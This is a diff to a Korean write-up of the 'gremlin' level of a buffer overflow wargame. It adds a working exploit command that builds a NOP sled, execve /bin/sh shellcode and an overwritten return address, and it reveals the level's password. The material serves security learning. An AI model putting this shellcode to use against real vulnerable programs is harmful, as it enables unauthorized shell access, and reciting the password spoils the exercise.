@@ -45,6 +45,11 @@ strcpy 함수가 실행된 후 브레이크 포인트를 건 이유는 인자로
 0x90의 값이 시작하는 부분은 **0xbffff918** 이다. buffer의 시작 주소를 알아냈으니 BOF 공격을 시도할 수 있다.
 
 ![](./picture/gremlin_5.JPG)
+
+```
+./gremlin `python -c 'print "\x90"*20+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"+"\x90"*215+"\x18\xf9\xff\xbf"'`
+```
+
 분석은 aaaaaaa 파일로 했지만 실행할 때는 gremlin으로 해야 한다. 앞에 nop으로 20바이트 채우고, 25바이트의 쉘 코드를 입력해줬다. 그리고 뒷부분을 nop으로 채우고, buffer 배열의 시작 주소를 넣어주었다.  
 즉, 256 바이트의 배열을 채우고, 4바이트의 SFP를 채운 후 RET 주소를 buffer 시작 주소로 넣어주어 쉘코드가 실행되도록 해주었다. 
 ```
@@ -52,3 +57,5 @@ NOP(20 byte) + SHELL CODE(25 byte) + NOP(215 byte) + buffer 시작 주소(4 byte
 ```
 
 `my-pass`로 알아낸 비밀번호는 **hello bof world** 이다.
+
+
